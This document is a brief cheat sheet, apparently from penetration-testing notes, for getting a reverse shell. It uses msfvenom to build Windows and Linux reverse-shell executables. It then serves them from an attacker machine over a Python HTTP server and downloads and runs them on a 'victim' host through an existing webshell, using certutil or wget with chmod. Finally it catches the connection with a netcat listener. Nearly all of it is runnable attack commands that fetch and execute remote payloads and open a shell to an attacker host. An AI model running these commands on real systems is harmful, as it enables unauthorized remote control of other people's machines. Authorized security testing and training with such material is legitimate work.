
## Generate shell with MSFvenom
https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
```
# Basic Windows shell
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4445 -f exe > shell.exe

# Basic Linux shell
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<KALI_IP> LPORT=4445 -f elf > shell.elf
```

## Transfer the shell to the victim host
Assuming we have a basic webshell
```
# On Kali
python -m http.server 8081

# On victim
  # Windows
  certutil.exe -urlcache -split -f http://<KALI_IP>:8081/shell.exe shell.exe

  # Linux
  wget http://<KALI_IP>:8081/shell.elf
  chmod +x shell.elf
  ./shell.elf
```

## Setup a netcat listener on Kali
```
nc -nlvp 4445
```
